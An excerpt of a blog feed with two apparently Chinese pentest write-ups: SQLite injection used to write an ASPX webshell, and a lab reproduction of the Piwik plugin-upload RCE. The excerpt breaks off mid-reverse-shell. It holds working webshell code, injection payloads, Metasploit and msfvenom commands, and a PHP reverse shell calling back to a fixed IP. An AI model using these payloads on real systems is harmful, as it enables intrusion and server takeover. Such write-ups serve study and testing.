实际中应用中遇到的问题及解决方法</h3><p>已知：该系统存在SQL注入，数据库为SQLite，通过报错发现web项目的绝对路径。后台存在弱口令，后台可以上传图片格式文件。</p><p>直接利用SQLite写aspx文件时，发现可以写入成功，但是SHELL没有执行。无法判断是shell代码未写入成功还是未执行成功。然后就先写个TXT查看shell代码是否可以写入成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';ATTACH DATABASE '</span>d:\\********\\web\\24.txt<span class="string">' AS pwn ;create TABLE pwn.exp (dataz text) ; insert INTO pwn.exp (dataz) VALUES ('</span>&lt;%@ Page Language=<span class="string">"Jscript"</span>&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%&gt;<span class="string">'); --</span></span><br></pre></td></tr></table></figure><p>然后直接访问根目录下的24.txt文件即可下载，下载后用SQLite数据库管理工具打开，这里用的是Navicat。</p><p><img src="24txt.jpg" alt="24txt"></p><p>打开发现竟然是空的。然而将shell代码替换为字符串<code>test</code>时可以写入成功。那应该就是写入的SHELL中含有一些符号所致，这里尝试了转义都未能解决。</p><p>由于可以找到图片上传的入口，所以有这样一个思路：在本地生成一个格式为jpg的数据库文件，创建表并写入SHELL，然后上传到服务器；在网站上利用注入新建一个txt格式的数据库，创建表后将图片格式数据库的内容插入到txt格式数据库中。</p><p><img src="%E7%94%9F%E6%88%90%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E9%A9%AC.jpg" alt="生成图片格式马"></p><p><img src="%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE%E5%BA%931.jpg" alt="恢复数据库1"></p><p>提示数据库编码不一致，那就换另外一种方法。首先在web根目录生成一个jpg格式的数据库，创建表后下载；在本地打开后插入数据，之后上传到服务器；再在网站新建一个ASPX格式的数据库，创建表后将图片格式数据库的内容插入到ASPX格式数据库中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';ATTACH DATABASE '</span>d:\\********\\web\\fp.jpg<span class="string">' AS pwn;create TABLE pwn.exp(dataz text);--</span></span><br></pre></td></tr></table></figure><p><img src="%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%94%9F%E6%88%90%E5%9B%BE%E7%89%87%E6%95%B0%E6%8D%AE%E5%BA%93.jpg" alt="服务器生成图片数据库"></p><p><img src="%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE%E5%BA%932.jpg" alt="恢复数据库2"></p><p>可以成功写入，但访问发现插入的ASPX代码被原样输出，SHELL未执行成功。然后来对比一下在web上生成和本地生成的文件有什么区别。</p><p>分别在本地和web上生成一个txt格式的数据库文件，新建表后插入<code>test</code>。然后对比其内容：</p><p><img src="%E6%95%B0%E6%8D%AE%E5%86%85%E5%AE%B9%E5%AF%B9%E6%AF%94.jpg" alt="数据内容对比"></p><p>对比后发现网站生成的内容都多了一个空格。</p><p>有同事提议说用十六进制试试，然后将shell内容转换为十六进制后插入。然而在web上测试失败。</p><p><img src="web%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%86%99SHELL1.jpg" alt="web十六进制写SHELL1"></p><p>本地测试也失败。</p><p><img src="%E6%9C%AC%E5%9C%B0%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%86%99%E6%96%87%E4%BB%B6.jpg" alt="本地十六进制写文件"></p><p>经过搜索发现，SQLite中十六进制的写法为：<code>x&#39;....&#39;</code>，而不是<code>0x....</code>。</p><p>例如<code>&lt;%@ Page Language=&quot;Jscript&quot;&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code>在SQLite中的十六进制表示为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x<span class="string">'3c25402050616765204c616e67756167653d224a736372697074223e3c256576616c28526571756573742e4974656d5b2270617373225d2c22756e7361666522293b253e'</span></span><br></pre></td></tr></table></figure><p>成功写入shell</p><p><img src="%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%86%99shell.jpg" alt="十六进制写shell"></p><p>菜刀连接：</p><p><img src="shell%E5%86%99%E5%85%A5%E6%88%90%E5%8A%9F.jpg" alt="shell写入成功"></p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>通过以上的测试过程和实际利用，可以归纳两点：</p><p>1.SQLite可以创建任意格式的数据库文件，并且插入的代码可以根据文件格式来解析，这就造成了可以利用这种方式写WEBSHELL的原因。<br>2.SQLite中十六进制的写法为：<code>x&#39;....&#39;</code>，而不是<code>0x....</code>。</p><h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p>[1]<a href="http://www.cnblogs.com/xiaozi/p/5760321.html" target="_blank" rel="noopener">http://www.cnblogs.com/xiaozi/p/5760321.html</a><br>[2]<a href="https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet" target="_blank" rel="noopener">https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet</a><br>[3]<a href="http://blog.csdn.net/mazhaojuan/article/details/7660657" target="_blank" rel="noopener">http://blog.csdn.net/mazhaojuan/article/details/7660657</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://www.sqlite.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SQLite&lt;/a&gt;是一种嵌入式数据库，它的数据库就是一个文件。由于SQLite本身是C写的，而且体积很小，所以经常被集成到各种应用程序中，主要在手机的App中使用。&lt;br&gt;之前没有遇到过关于SQLite的注入，这次遇到一个在ASPX中使用SQLite数据库，并且存在注入。这篇文章将主要介绍一下从注入到获取WEBSHELL的过程和遇到的一些坑。&lt;br&gt;首先介绍一下SQLite的使用方法，然后在本地搭建环境以及利用注入获取WEBSHELL，最后将讲述在实际应用中遇到的问题以及如何解决（e.g.手工注入写shell）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://fuping.site/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="WEBSHELL" scheme="https://fuping.site/tags/WEBSHELL/"/>
    
      <category term="SQLite" scheme="https://fuping.site/tags/SQLite/"/>
    
  </entry>
  
  <entry>
    <title>Piwik代码执行漏洞安全分析（附验证过程Getshell）</title>
    <link href="https://fuping.site/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/"/>
    <id>https://fuping.site/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/</id>
    <published>2017-07-12T09:50:14.000Z</published>
    <updated>2017-07-12T05:21:58.177Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h3><p><a href="https://piwik.org/" target="_blank" rel="noopener">Piwik</a>是一个PHP和MySQL的开放源代码的Web统计软件. 它给你一些关于你的网站的实用统计报告，比如网页浏览人数, 访问最多的页面, 搜索引擎关键词等等。</p><p>Piwik拥有众多不同功能的插件，你可以添加新的功能或是移除你不需要的功能，Piwik同样可以安装在你的服务器上面，数据就保存在你自己的服务器上面。你可以非常容易的插入统计图表到你的博客或是网站抑或是后台的控制面板中。安装完成后，你只需将一小段代码放到将要统计的网页中即可。</p><a id="more"></a><p>在17年2月份<a href="https://firefart.at/post/turning_piwik_superuser_creds_into_rce/" target="_blank" rel="noopener">FireFart</a>报告了一个Piwik超级用户获取远程代码执行的漏洞。该漏洞通过利用构造插件，然后利用超级用户上传并激活，在激活插件时会执行插件中的PayLoad，从而获取shell。本文将介绍一下漏洞原理、环境的搭建、PayLoad的构造以及漏洞的复现过程，如有不足，请多多指教。</p><h3 id="0x02-漏洞原理分析"><a href="#0x02-漏洞原理分析" class="headerlink" title="0x02 漏洞原理分析"></a>0x02 漏洞原理分析</h3><p>插件激活时请求的URL为：<br><a href="http://192.168.217.1/piwik-3.0.1/index.php?module=CorePluginsAdmin&amp;action=activate&amp;idSite=1&amp;period=day&amp;date=yesterday&amp;nonce=4fe9b3937078e06f3f24d45a53ee614c&amp;pluginName=ff" target="_blank" rel="noopener">http://192.168.217.1/piwik-3.0.1/index.php?module=CorePluginsAdmin&amp;action=activate&amp;idSite=1&amp;period=day&amp;date=yesterday&amp;nonce=4fe9b3937078e06f3f24d45a53ee614c&amp;pluginName=ff</a></p><p>代码定位到<code>piwik-3.0.1\plugins\CorePluginsAdmin\Controller.php</code>中的activate方法。</p><p>找到pluginManager调用的激活插件方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span><span class="params">($redirectAfter = true)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $pluginName = <span class="keyword">$this</span>-&gt;initPluginModification(<span class="keyword">static</span>::ACTIVATE_NONCE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dieIfPluginsAdminIsDisabled();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;pluginManager-&gt;activatePlugin($pluginName);<span class="comment">//激活插件</span></span><br><span class="line">        ....</span><br><span class="line">        <span class="comment">//省略部分代码</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>然后往上翻，找到pluginManager变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $pluginManager;</span><br><span class="line">....</span><br><span class="line"><span class="comment">//省略部分代码</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;pluginManager = Plugin\Manager::getInstance();</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>定位到<code>piwik-3.0.1\core\Plugin\Manager.php</code>文件，找到其activatePlugin方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">activatePlugin</span><span class="params">($pluginName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">....</span><br><span class="line">        <span class="comment">//省略部分代码</span></span><br><span class="line">        <span class="comment">// Load plugin</span></span><br><span class="line">        $plugin = <span class="keyword">$this</span>-&gt;loadPlugin($pluginName);</span><br><span class="line">        <span class="keyword">if</span> ($plugin === <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">"The plugin '$pluginName' was found in the filesystem, but could not be loaded.'"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;installPluginIfNecessary($plugin);</span><br><span class="line">        $plugin-&gt;activate();</span><br><span class="line">....</span><br><span class="line">        <span class="comment">//省略部分代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>loadPlugin是根据插件名字加载，最后生成一个类对象，可以直接调用其中的方法，其代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadPlugin</span><span class="params">($pluginName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;loadedPlugins[$pluginName])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;loadedPlugins[$pluginName];</span><br><span class="line">    &#125;</span><br><span class="line">    $newPlugin = <span class="keyword">$this</span>-&gt;makePluginClass($pluginName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;addLoadedPlugin($pluginName, $newPlugin);</span><br><span class="line">    <span class="keyword">return</span> $newPlugin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>installPluginIfNecessary方法是判断该插件是否安装，如果没有安装的话，调用executePluginInstall方法来安装，executePluginInstall方法执行了插件中的install()方法，然后再执行activate()方法。</p><p>由此可知，当激活插件时，会加载插件，将其生成为类对象。然后判断是否安装插件，如果没有安装，调用插件中的install()方法，再调用activate()方法。<br>接下来就开始搭建环境具体来实现一下。</p><h3 id="0x03-环境的搭建"><a href="#0x03-环境的搭建" class="headerlink" title="0x03 环境的搭建"></a>0x03 环境的搭建</h3><h4 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h4><p>主机：Windows10 x64</p><p>WEB环境：采用的是phpStudy集成环境（PHP/5.5.30，MySQL/5.5.47，Apache/2.4.18 ）</p><p>程序版本：<a href="https://www.exploit-db.com/apps/cec6f1b03cc8ed4e62754919c5922d42-piwik-3.0.1.tar.gz" target="_blank" rel="noopener">3.0.1</a>(也可以在<a href="https://builds.piwik.org/" target="_blank" rel="noopener">https://builds.piwik.org/</a> 下载)</p><h4 id="2-composer工具的安装"><a href="#2-composer工具的安装" class="headerlink" title="2.composer工具的安装"></a>2.composer工具的安装</h4><p>下载地址：<a href="https://getcomposer.org/Composer-Setup.exe" target="_blank" rel="noopener">https://getcomposer.org/Composer-Setup.exe</a></p><p>下载后直接运行Composer-Setup.exe进行安装。</p><p><img src="composer_setup_1.jpg" alt="composer安装"></p><p><img src="composer_setup_2.jpg" alt="选择PHP.exe的位置"></p><p>然后根据提示，继续下一步即可。</p><blockquote><p>注意：安装时PHP应开启php_openssl扩展，不然会报错。</p></blockquote><h4 id="3-Piwik程序的部署"><a href="#3-Piwik程序的部署" class="headerlink" title="3.Piwik程序的部署"></a>3.Piwik程序的部署</h4><p>将下载下来的程序源码解压到phpStudy下的WWW目录。这里我项目名字为piwik-3.0.1。</p><p>在piwik-3.0.1目录下执行<code>composer install</code>命令来安装项目所依赖的代码库。</p><p><img src="composer_setup_3.png" alt="依赖的代码库的安装"></p><p>安装后在项目的根目录会出现一个vendor文件夹。</p><p><img src="vendor_files.jpg" alt="vendor目录下文件"></p><p>访问<a href="http://192.168.217.1/piwik-3.0.1/" target="_blank" rel="noopener">http://192.168.217.1/piwik-3.0.1/</a> 开始进行安装</p><p><img src="Piwik_setup.jpg" alt="Piwik安装"></p><p>点击Next进行下一步安装。</p><p>数据库设置</p><p><img src="Piwik_Database_setup.png" alt="数据库设置"></p><p>超级用户设置</p><p><img src="Piwik_superUser_set.jpg" alt="超级用户设置"></p><p>之后进行系统的设置，这里就省略过程了。</p><p>安装完成后访问<a href="http://192.168.217.1/piwik-3.0.1/" target="_blank" rel="noopener">http://192.168.217.1/piwik-3.0.1/</a> 进行登陆。</p><p><img src="piwik_login.jpg" alt="piwik登陆人口"></p><blockquote><p>用户名/密码为第五步中设置的超级用户。</p></blockquote><h3 id="0x04-验证过程"><a href="#0x04-验证过程" class="headerlink" title="0x04 验证过程"></a>0x04 验证过程</h3><h4 id="1-漏洞产生原因及PayLoad的编写"><a href="#1-漏洞产生原因及PayLoad的编写" class="headerlink" title="1.漏洞产生原因及PayLoad的编写"></a>1.漏洞产生原因及PayLoad的编写</h4><p>Piwik默认在3.0.3之前允许自定义插件上传，当插件被激活时，install方法会被调用，会执行其中编写的PayLoad。</p><p>如果我们编写一个名字叫做pwned的插件，其文件结构为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwned/</span><br><span class="line">pwned/pwned.php</span><br><span class="line">pwned/plugin.json</span><br></pre></td></tr></table></figure><p>文件内容：</p><p>pwned.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">pwned</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwned</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="comment">//要执行的Payload</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>plugin.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"pwned"</span>,<span class="comment">//插件名称</span></span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">"DESCRIPTION"</span>,<span class="comment">//插件描述</span></span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0"</span>,<span class="comment">//插件版本</span></span><br><span class="line">  <span class="attr">"theme"</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将其压缩为zip格式的压缩文件。当插件上传后并被激活时，就会执行pwned.php中的payload。</p><h4 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h4><p><strong>PayLoad的准备</strong></p><p>修改上述的pwned.php代码，在install方法中添加写shell的代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">pwned</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwned</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    $myfile = fopen(<span class="string">"shell.php"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$content = <span class="string">"&lt;?eval(\$_POST['pass']);?&gt;"</span>;</span><br><span class="line">fwrite($myfile, $content);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>plugin.json不用做过多的修改。</p><p>然后压缩为pwned.zip。</p><p><strong>PayLoad的利用</strong></p><p>利用创建的超级用户登陆，登陆后点击Administration或者访问<a href="http://192.168.217.1/piwik-3.0.1/index.php?module=CoreAdminHome&amp;action=home&amp;idSite=1&amp;period=day&amp;date=yesterday" target="_blank" rel="noopener">http://192.168.217.1/piwik-3.0.1/index.php?module=CoreAdminHome&amp;action=home&amp;idSite=1&amp;period=day&amp;date=yesterday</a></p><p><img src="piwik_plugins.jpg" alt="piwik 插件人口"></p><p>安装新插件</p><p><img src="piwik_plugins_install.jpg" alt="piwik 安装新插件人口"></p><p>上传新插件</p><p><img src="piwik_plugins_upload.jpg" alt="piwik 插件市场"></p><p>插件上传</p><p><img src="piwik_plugins_uploading.jpg" alt="piwik 插件上传"></p><p>插件上传成功</p><p><img src="piwik_plugins_uploadsuccess.jpg" alt="piwik 插件上传成功"></p><p>然后点击激活插件按钮</p><p><img src="plugin_activated.jpg" alt="插件激活"></p><p>插件激活后，会在根目录生成一个shell.php</p><p><img src="shell.jpg" alt="shell"></p><h4 id="3-利用Metasploit生成meterpreter会话"><a href="#3-利用Metasploit生成meterpreter会话" class="headerlink" title="3.利用Metasploit生成meterpreter会话"></a>3.利用Metasploit生成meterpreter会话</h4><p>上面的结果是写入了WEBSHELL，也可以采用piwik_superuser_plugin_upload直接生成一个meterpreter会话。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/unix/webapp/piwik_superuser_plugin_upload </span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; </span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> PASSWORD admin888</span><br><span class="line">PASSWORD =&gt; admin888</span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> RHOST 192.168.217.1</span><br><span class="line">RHOST =&gt; 192.168.217.1</span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> TARGETURI /piwik-3.0.1/</span><br><span class="line">TARGETURI =&gt; /piwik-3.0.1/</span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; <span class="built_in">set</span> USERNAME admin</span><br><span class="line">USERNAME =&gt; admin</span><br><span class="line">msf exploit(piwik_superuser_plugin_upload) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="msf_win01.jpg" alt="脚本说明"></p><p><img src="msf_win02.jpg" alt="成功反弹生成meterpreter会话"></p><blockquote><p>利用Metasploit时有时候会不成功，或者是第一次成功之后无法再次复现。但是利用上传webshell可以成功。</p></blockquote><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>之前在3月份曾经遇到过类似的站点，然后本地搭建环境测试的时候，只顾着用Metasploit进测试，并没有出结果，就没继续下去了。最近又重新看了一下原理，然后实现并记录一下过程。</p><p>这里仅仅用3.0.1举例，根据<a href="https://github.com/rapid7/metasploit-framework/pull/7917" target="_blank" rel="noopener">firefart</a>说的影响版本2.14.0/2.16.0/2.17.1/3.0.1，其他并未测试。</p><p>Q:直接上传包含shell的压缩包可以吗？</p><p>A:可以上传成功，但在plugins目录下无法执行php代码。</p><p><img src="shell_forbidden.jpg" alt="plugins目录下无法执行php代码"></p><p>Q:Payload中除了install()方法还可以写其他方法吗？</p><p>A:可以的。例如还有uninstall/deactivate/activate等方法，分别在卸载插件/关闭插件/激活插件的时候调用。例如如下的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">ff</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span>//安装插件，执行一次</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">$myfile = fopen(<span class="string">"install.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$content = <span class="string">"install ..."</span>;</span><br><span class="line">fwrite($myfile, $content);</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uninstall</span><span class="params">()</span>//卸载插件，执行一次</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">$myfile = fopen(<span class="string">"uninstall.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$content = <span class="string">"uninstall ..."</span>;</span><br><span class="line">fwrite($myfile, $content);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deactivate</span><span class="params">()</span>//关闭插件，可以多次执行</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">$myfile = fopen(<span class="string">"deactivate.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$content = <span class="string">"deactivate ..."</span>;</span><br><span class="line">fwrite($myfile, $content);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span><span class="params">()</span>//激活插件，可以多次执行</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">$myfile = fopen(<span class="string">"activate.txt"</span>, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$content = <span class="string">"activate ..."</span>;</span><br><span class="line">fwrite($myfile, $content);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Q:可以上传WEBSHELL，但是利用Metasploit无法生成meterpreter会话，还想反弹shell怎么办？</p><p><img src="msf_error.jpg" alt="无法生成meterpreter会话"></p><p>A:可以利用手动上传插件的方法，将其中的Payload修改为反弹shell的代码。</p><p>具体可以这样操作：</p><p>首先看看Metasploit利用的Payload是什么。</p><p>可以在generate_plugin方法中添加打印payload.encoded的语句，例如使用<code>print_status(&quot;data:#{payload.encoded}&quot;)</code>将其内容打印出来</p><p><img src="payload_getdata.jpg" alt="打印Payload"></p><p>然后使用<code>reload_all</code>重新加载脚本，并使用piwik_superuser_plugin_upload脚本，将会打印出来payload的内容</p><p><img src="payload_datas.jpg" alt="payload内容"></p><blockquote><p>或者可以利用<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.131.128 LPORT=4444 -f raw &gt;c.php</code>来生成payload，内容一样</p></blockquote><p>然后将生成的内容放在插件PHP代码中。整理格式后如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Piwik</span>\<span class="title">Plugins</span>\<span class="title">pwned</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwned</span> <span class="keyword">extends</span> \<span class="title">Piwik</span>\<span class="title">Plugin</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    error_reporting(<span class="number">0</span>); </span><br><span class="line">$ip = <span class="string">'192.168.131.128'</span>; </span><br><span class="line">$port = <span class="number">4444</span>; </span><br><span class="line"><span class="keyword">if</span> (($f = <span class="string">'stream_socket_client'</span>) &amp;&amp; is_callable($f)) &#123;</span><br><span class="line">$s = $f(<span class="string">"tcp://&#123;$ip&#125;:&#123;$port&#125;"</span>); $s_type = <span class="string">'stream'</span>;</span><br><span class="line">&#125; <span 